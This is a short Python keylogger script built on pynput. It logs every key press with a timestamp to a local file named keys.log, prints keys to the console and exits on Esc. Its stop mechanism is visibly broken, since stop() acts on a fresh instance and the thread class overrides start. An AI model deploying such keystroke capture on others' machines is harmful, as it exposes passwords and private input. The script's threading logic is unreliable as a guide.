from pynput import keyboard
import logging
import threading
import time

class KeyLogger:
        def __init__(self):
                super().__init__()
                self.quitKeylogger = False
        def start(self):
                logging.basicConfig(filename="keys.log",level=logging.DEBUG, format='%(asctime)s %(message)s')

                def on_press(key):
                        print(str(self.quitKeylogger))
                        print('Key {} pressed.'.format(key))
                        logging.debug(str(key))
                        print(str(self.quitKeylogger))

                def on_release(key):
                        if key == keyboard.Key.shift:
                                print()
                        elif key == keyboard.Key.delete:
                                print('bar')
                        elif key == keyboard.Key.esc:
                                return False

                def get_current_key_input():
                        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                                listener.join()
                get_current_key_input()
        def stop(self):
                self.quitKeylogger = True
                print("exiting")
                print(str(self.quitKeylogger))
class KeyLoggerStop (threading.Thread):
        def __init__(self):
                super().__init__()
        def start(self):
                print(threading.enumerate())
                print(threading.enumerate())
                time.sleep(5)
                KeyLogger().stop()     
KeyLogger().start()           
KeyLoggerStop().start()
time.sleep(2)
KeyLoggerStop().join()
